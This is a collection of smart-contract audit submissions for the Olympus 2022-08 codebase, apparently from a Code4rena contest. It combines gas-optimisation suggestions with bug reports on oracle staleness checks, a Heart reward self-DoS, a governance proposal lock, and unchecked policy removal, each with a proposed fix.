1)It costs more gas to initialize variables to zero than to let the default of zero be applied  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for (uint256 i = 0; i < numIterations; ++i) { should be replaced with for (uint256 i; i < numIterations; ++i) {      File: 2022-08-olympus\src\Kernel.sol   397,14:         for (uint256 i = 0; i < reqLength; ) {  File: 2022-08-olympus\src\utils\KernelUtils.sol   43,10:     for (uint256 i = 0; i < 5; ) {   58,10:     for (uint256 i = 0; i < 32; ) {   2)<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP,   storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset     File: 2022-08-olympus\src\policies\Governance.sol     278,47:         for (uint256 step; step < instructions.length; ) {   3)Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  File: 2022-08-olympus\src\modules\PRICE.sol   59,11:     uint8 public constant decimals = 18;     File: 2022-08-olympus\src\modules\RANGE.sol   65,13:     uint256 public constant FACTOR_SCALE = 1e4;  File: 2022-08-olympus\src\policies\Governance.sol   121,13:     uint256 public constant SUBMISSION_REQUIREMENT = 100;   124,13:     uint256 public constant ACTIVATION_DEADLINE = 2 weeks;   127,13:     uint256 public constant GRACE_PERIOD = 1 weeks;   130,13:     uint256 public constant ENDORSEMENT_THRESHOLD = 20;   133,13:     uint256 public constant EXECUTION_THRESHOLD = 33;   137,13:     uint256 public constant EXECUTION_TIMELOCK = 3 days;  File: 2022-08-olympus\src\policies\Operator.sol   89,12:     uint32 public constant FACTOR_SCALE = 1e4;    4)X = X + Y IS CHEAPER THAN X += Y      File: 2022-08-olympus\src\modules\PRICE.sol   136,28:             _movingAverage += (currentPrice - earliestPrice) / numObs;   222,19:             total += startObservations_[i];  File: 2022-08-olympus\src\modules\TRSRY.sol   96,41:         reserveDebt[token_][msg.sender] += amount_;   97,27:         totalDebt[token_] += amount_;   131,50:         if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  File: 2022-08-olympus\src\modules\VOTES.sol   58,28:             balanceOf[to_] += amount_;  File: 2022-08-olympus\src\policies\BondCallback.sol   143,35:         _amountsPerMarket[id_][0] += inputAmount_;   144,35:         _amountsPerMarket[id_][1] += outputAmount_;  File: 2022-08-olympus\src\policies\Governance.sol   198,51:         totalEndorsementsForProposal[proposalId_] += userVotes;   252,60:             yesVotesForProposal[activeProposal.proposalId] += userVotes;   254,59:             noVotesForProposal[activeProposal.proposalId] += userVotes;  File: 2022-08-olympus\src\policies\Heart.sol   103,18:         lastBeat += frequency();            
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171   # Vulnerability details  ## Impact Price oracle may fail and revert due to the inconsistency in the staleness checks.   ## Proof of Concept  In the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.   ## Tools Used Manual review, talking with devs  ## Recommended Mitigation Steps Change the line 171 to  ```             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) ``` like line 165. 
# Low Risk and Non-Critical Issues  ## Low Risk ##  ### [L-01]: Missing check ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L79  **Description:**  Missing check that observationFrequency_ not equal to zero.  For example, there is a check that observationFrequency_ not equal to zero [here](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L268).   Constructor will not indicate Price_InvalidParams() error without that check.  **Recommendation:**  Change to:   ``` if (observationFrequency_ == 0 || movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency_ != 0) ```  ## Non-Critical Issues ##  ### [N-01]: Constants instead of unknown variables ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 (5)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58 (32)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L90 (38)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L245 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L246 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L247 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L248 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L264 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L217 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L106 (10_000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L111 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L518 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L535 (10_000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L550 (10000 and 100)   **Description:**  Use constant variables to make the code easier to understand and maintain.  **Recommendation:**  Define constants instead of unknown variables.   ### [N-02]: Public function can be external ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L47  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L20  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L110  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L108  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L22  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28    **Description:**  Public functions can be declared external if they are not called by the contract.  **Recommendation:**  Declare these functions as external instead of public. 
# Report ## Gas Optimizations ##  ### [G-01]: Use new variable instead of reading array length in every loop of a for-loop ### **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278   **Description:**  If you read the length of the array at each iteration of the loop, this consumes a lot of gas.   **Recommendation:**  Store the array’s length in a variable before the for-loop, and use this new variable in the loop.   ### [G-02]: variable can be immutable ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32   **Description:**  Variable is set in the constructor and never modified after that.  **Recommendation:**  It is more gas efficient to mark it as immutable.   ### [G-03]: X += Y costs more gas than X = X + Y ### **Context: **   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194  **Recommendation:**  Change X += Y (X -= Y) to X = X + Y (X = X - Y).   ### [G-04]: i++ costs more gas than ++i ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691   **Recommendation:**  Change i++ (i--) to ++i (--i).  ### [G-05]: Don't initialize variable with its default value ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58  **Description:**  Default value of uint is 0. It's unnecessary and costs more gas to initialize uint variavles to 0.  **Recommendation:**  Change uint256 i = 0; to uint256 i;   ### [G-06]: >0 costs more gas than !=0 ### **Context:**   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247  **Description:**  uint256 is a unsigned integer.   userVotesForProposal[activeProposal.proposalId][msg.sender] will never be less than 0.  **Recommendation:**  Change to  ``` if (userVotesForProposal[activeProposal.proposalId][msg.sender] != 0) { ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115   # Vulnerability details  Rewards for Heart `beat` are sent via `_issueReward`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115  ```solidity      function _issueReward(address to_) internal {         rewardToken.safeTransfer(to_, reward);         emit RewardIssued(to_, reward);     }  ```  The function doesn't check for available tokens e.g. `min(reward, rewardToken.balanceOf(address(this)));`   In case of calling `withdrawUnspentRewards`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152  ```solidity     /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     } ```  Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.  While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.  ## Remediation  Add a check for available tokens `min(reward, rewardToken.balanceOf(address(this)));`
# Executive Summary  Codebase is gas conscious and basic gas saving advice is followed pretty thoroughly, below are listed a few extra optimizations, sorted by efficacy  ## Optimized `updateMovingAverage` - 200+ gas saved per function call  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L133-L145  ```solidity          // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;  ```  Can be changed to  ```solidity          // Calculate new moving average          /// @audit Use unchecked as you already checked for overflow         unchecked {           if (currentPrice > earliestPrice) {               _movingAverage += (currentPrice - earliestPrice) / numObs;           } else {               _movingAverage -= (earliestPrice - currentPrice) / numObs;           }            // Push new observation into storage and store timestamp taken at           /// @audit also unchecked addition           /// @audit Cache the value of `nextObsIndex` to save an SLOAD           uint32 cachedNextObsIndex = nextObsIndex;           observations[cachedNextObsIndex] = currentPrice;           lastObservationTime = uint48(block.timestamp);           nextObsIndex = (cachedNextObsIndex + 1) % numObs;         }  ```  ## Avoidable Second STATICCALL - 100+ gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L238-L239  ```solidity             ensureValidKeycode(Module(target_).KEYCODE());  ```  Can instead cache keycode = Module(target_).KEYCODE(); and pass it to the next function `_installModule(target_, keycode);  Saving over 100 gas (STATICCALL + cost of processing the string for the return value)  ## Cache Storage Var - Save 100 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L165-L166  ```solidity             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))  ```  Cache the value of `observationFrequency` to save 100 gas  ## Free Unchecked - 80+ gas  You can wrap the code below in unchecked to gain around 80 gas;  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44-L45  ```solidity         uint256 instructionsId = ++totalInstructions;  ```   # Usual Suspects  ## Cache length - 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L279  ```solidity         for (uint256 step; step < instructions.length; ) {  ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221 https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304   # Vulnerability details  ## Impact Currently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.  And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.  But `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.   ## Proof of Concept The below scenario would be possible. 1. `Proposal 1` was submitted and activated successfully. 2. Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%` 3. This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`. 4. Currently the contract contains more than 81% of total votes and users have at most 19% in total. 5. Also users can't reclaim their votes among 81% while `Proposal 1` is active. 6. So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221). 7. So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.  I am not sure we can use the current `GRACE_PERIOD` for that purpose.  So `reclaimVotes()` should be modified like below.  ``` function reclaimVotes(uint256 proposalId_) external {     uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];      if (userVotes == 0) {         revert CannotReclaimZeroVotes();     }      if (proposalId_ == activeProposal.proposalId) {         if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++         {             revert CannotReclaimTokensForActiveVote();         }     }      if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         revert VotingTokensAlreadyReclaimed();     }      tokenClaimsForProposal[proposalId_][msg.sender] = true;      VOTES.transferFrom(address(this), msg.sender, userVotes); } ```
# Executive Summary  The idea of Modules and Policies is brilliant!  Most of the codebase is well written and well thought out, the one exception to me was Governance which I don't believe will withstand an adversarial environment.  Minor Code smells are listed below rated via the following standard  ## Legend:  - L -> Low Severity -> Could cause issues however impact / probability is limited - R -> Refactoring -> Suggested Code Change to improve readability and maintainability or to offer better User Experience - NC -> Non-Critical / Informational -> No risk of loss, pertains to events or has no impact  ## L - Burning `VOTES` from Governance will break accounting  While burning `VOTES` from the `Governance` contract is questionable, the code has no check to prevent that.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L38-L42  ```solidity      function burnFrom(address wallet_, uint256 amount_) external permissioned {         _burn(wallet_, amount_);     }  ```  Because `Governance` and `VOTES.transferFrom` relies on a "use -> refund" pattern, losing even 1 wei of token will cause `reclaimVotes` to revert, effectively denying a user from being able to vote again.  Voting can be denied by simply burning their `VOTES` hence why I set the severity to Low as this is a Ban with extra steps as the `voter_admin` can just burn the votes from the user  ## L - Allow others to repay the debt  `repayLoan` allows only the caller to repay their own debt, this can create situations in which insolvency or a smart contract bug prevent from making the TRSRY whole.  A straightforward solution would be to allow anyone to repay the loan on behalf of a specific address  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L103-L110  ```solidity      /// @notice Lets an address with debt repay their loan.     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_); ```   By allowing other addresses a softer approach to repaying debt can be achieved.  This avoids having to manually reset the debt.   ## L - `_activatePolicy` is non CEI conformant  The function `_activatePolicy` will perform an external call to `policy_.configureDependencies()` and then it will change storage.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L298-L315  ```solidity         // Add policy to list of active policies         activePolicies.push(policy_);         getPolicyIndex[policy_] = activePolicies.length - 1;          // Record module dependencies         Keycode[] memory dependencies = policy_.configureDependencies();         uint256 depLength = dependencies.length;          for (uint256 i; i < depLength; ) {             Keycode keycode = dependencies[i];              moduleDependents[keycode].push(policy_);             getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1;              unchecked {                 ++i;             }         } ```  I wasn't able to find any exploit as the function is privileged  ## R - `get` for a state changing function  `getXyz` is typically used for retrieving values from view functions, however in the case of `TRSRY` the function is used to receive a loan.  Because the codebase already uses `get` for view functions, I'd recommend renaming the function below to `receiveLoan` or just `loan` to keep the coding convention  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L92-L93  ```solidity     function getLoan(ERC20 token_, uint256 amount_) external permissioned {  ```   ## R - Can check contract existence without assembly  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L31-L37  ```solidity function ensureContract(address target_) view {     uint256 size;     assembly {         size := extcodesize(target_)     }     if (size == 0) revert TargetNotAContract(target_); } ```  Can be changed to ```solidity target_.code.length ```   ## Lack of Address(0) Zero-Checks  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L66-L67  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78   ## NC - Lack of event for setters  Throughout the codebase, most setters emit events, however `setActiveStatus` doesn't  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L127-L128  ```solidity         isActive = activate_;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78  ## NC - Events not emitted in constructor  While setters emit events, the constructor doesn't, this may cause issues with tracking, e.g. theGraph as an event is for the initial setting is not emitted   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L217-L220  ```solidity     constructor() {         executor = msg.sender;         admin = msg.sender;     } ```  ## NC - Gibberish action will still emit an event  You may instead want to emit only when a valid action is executed Or add a comment to the function mentioning that  As it stands the code will emit even if the action data is not recognized  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L259-L260  ```solidity         emit ActionExecuted(action_, target_);  ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325   # Vulnerability details  ## Impact There are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.   ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325  ## Recommended Mitigation Steps Adding `require(activePolicies[idx] == policy_, "Unregistered policy");` will prevent this, where `idx = getPolicyIndex[policy_]`.  **NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor. 
 ## 1. Inline a modifier that’s only used once ### Description As onlyGovernor() is only used once in this contract (in function executeAction()), it should get inlined to save gas:  ### Instances //Links to github files: [Kernel.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L223)    *Actual codes used*   ``` src/Kernel.sol:223:    modifier onlyExecutor() { ```  ### Instances where modifiers are used only once //Links to github files: [Kernel.sol:L235](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L235)   *Actual codes used* ``` src/Kernel.sol:235:    function executeAction(Actions action_, address target_) external onlyExecutor { ``` ----  ## 2.++I COSTS LESS GAS COMPARED TO I++ OR I += 1 ### Description *Pre-increments and pre-decrements are cheaper.*  For a `uint256` i variable, the following is true with the Optimizer enabled at 10k: Increment: `i += 1` is the most expensive form `i++` costs `6` `gas` less than `i += 1` `++i` costs `5 gas` less than `i++` (11 gas less than i += 1)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name post-increment: ### Instances // Links to Github file [Operator.sol:L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) [Operator.sol:L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) [Operator.sol:L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) [KernelUtils.sol:L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) [KernelUtils.sol:L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)   *Actual codes used* ``` src/policies/Operator.sol:488:            decimals++; src/policies/Operator.sol:670:                _status.low.count++; src/policies/Operator.sol:686:                _status.high.count++; src/utils/KernelUtils.sol:49:            i++; src/utils/KernelUtils.sol:64:            i++; ```  ---- ## 3.`<ARRAY>.LENGTH` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP ### Description The overheads outlined below are `PER LOOP`, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use `MLOAD` (3 gas) calldata arrays use `CALLDATALOAD` (3 gas) Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset ### Instances // Links to github files [Governance.sol:L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)   *Actual codes used* ``` src/policies/Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  ---- ## 4. Comparisons: Boolean comparisons ### Description Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true) and if(!directValue) instead of if(directValue == false)  ### Instances //Links to github files: [Governance.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223) [Governance.sol:L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   *Actual codes used* ``` src/policies/Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { src/policies/Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ----  ## 5. IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for `(uint256 i = 0; i < numIterations; ++i)` { should be replaced with for `(uint256 i; i < numIterations; ++i) {`  ### Instances // Links to gihthub file   [Kernel.sol:L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397) [KernelUtils.sol:L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43) [KernelUtils.sol:L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58)  *Actual codes used* ``` src/Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ```  ---- ## 6. Strict inequalities (>) are more expensive than non-strict ones (>=)  Strict inequalities (>) are more expensive than non-strict ones (>=). This is due to some supplementary checks (ISZERO, 3 gas. I suggest using >= instead of > to avoid some opcodes here:  ### Instances: [RANGE.sol:L245](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245) [RANGE.sol:L247](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247) [RANGE.sol:L249](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L249) [Operator.sol:L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L115) [Operator.sol:L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L254) [Operator.sol:L262](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L262) ``` src/modules/RANGE.sol:245:            wallSpread_ > 10000 || src/modules/RANGE.sol:247:            cushionSpread_ > 10000 || src/modules/RANGE.sol:249:            cushionSpread_ > wallSpread_ src/policies/Operator.sol:115:            configParams[6] > configParams[7] || src/policies/Operator.sol:254:                    currentPrice < range.cushion.high.price || currentPrice > range.wall.high.price src/policies/Operator.sol:262:                    currentPrice > range.cushion.high.price && currentPrice < range.wall.high.price ``` ### References:  [https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than](https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than)   ---- ## 7. Use a more recent version of solidity ### Description Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ### Instances: //Links to github files: [IBondCallback.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol#L2) [IOperator.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L2) 